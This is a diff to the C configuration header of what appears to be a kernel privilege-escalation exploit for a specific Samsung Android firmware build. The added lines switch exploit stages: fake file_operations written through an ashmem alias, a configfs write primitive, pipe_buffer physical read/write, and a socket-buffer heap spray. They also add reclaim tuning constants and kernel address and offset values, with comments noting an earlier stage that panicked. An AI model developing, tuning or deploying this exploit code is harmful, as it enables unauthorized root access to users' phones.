@@ -5,6 +5,23 @@
 #define BUILD_VARIANT_LABEL "a55x-A556EXXUEDZE4-app-physical-p0-oracle"
 #define APP_PHYS_P0_ORACLE 1
 #define APP_TRACEFS_SLIDE 1
+/* Campaign 32: adopt the dm1q/gts9 device-proven order. The closed fops
+ * route writes the fake file_operations directly through the ashmem alias,
+ * so the fops payload page no longer targets the physical-P0 pipe oracle
+ * (util.c prepare_skb_payload skips the p0 bank slots under
+ * APP_CLOSED_FOPS_ROUTE). APP_FOPS_BEFORE_PIPE then defers the pipe arsenal
+ * until after the configfs write primitive is verified, which skips the
+ * pipe-first p0-oracle prep that preceded the campaign 31 panic. Tracefs
+ * supplies the slide, so no P0 gate/probe oracle is used on this route. */
+#define APP_CLOSED_FOPS_ROUTE 1
+#define APP_FOPS_BEFORE_PIPE 1
+/* Post-fops pipe physrw must use the pipe_buffer found in the reclaimed
+ * page; never fall back to forging unrelated slots (dm1q/gts9 production). */
+#define APP_EXACT_PIPE_BUFFER_ONLY 1
+/* Replace the standard SKB/mm reclaim (the campaign 31 panic stage) with the
+ * dm1q/gts9 controlled mm-group drain + 32-pair skb spray. The S918_*
+ * constants below are the shared, device-independent reclaim tuning. */
+#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
 #else
 #define BUILD_VARIANT_LABEL "a55x-A556EXXUEDZE4-root-umh"
 #endif
@@ -35,6 +52,17 @@
  * non-fresh 1 MiB SO_SNDBUF (16*0x8e80=0x8e800). */
 #define SLIDE_SKB_SEND_SIZE 0x8e80
 #define SKB_RECLAIM_SENDS 16
+
+/* Controlled mm-group reclaim tuning (dm1q/gts9 shared set; mechanics only,
+ * no UEDZE4-derived offsets). Required by APP_CONTROLLED_MM_GROUP_RECLAIM. */
+#define S918_PAGE_SCAN_MAX 256
+#define S918_KSNITCH_HINT_COLLISIONS 2
+#define S918_KSNITCH_FULL_COLLISIONS 5
+#define S918_DMA32_SKIP_SLABS 8
+#define S918_TRIGGER_SLABS 24
+#define S918_SKB_SENDS 256
+#define S918_SKB_SNDBUF 8388608
+#define S918_RECLAIM_SOCKET_PAIRS 32
 
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
@@ -124,6 +152,13 @@
 #define DIRECT_MAP_BASE 0xffffff8000000000ULL
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffe00000000ULL
+
+/* Controlled mm-group zone classification (dm1q/gts9 values): the first
+ * 128 MiB of the direct map is the DMA32 alias; the rest is normal. */
+#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
+#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
+#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
+#define MM_NORMAL_ALIAS_END KERNELSNITCH_IDENTITY_END
 
 #define ASHMEM_MISC_FOPS_OFF 0x02464430ULL
 #define ASHMEM_FOPS_OFF 0x013c9b50ULL
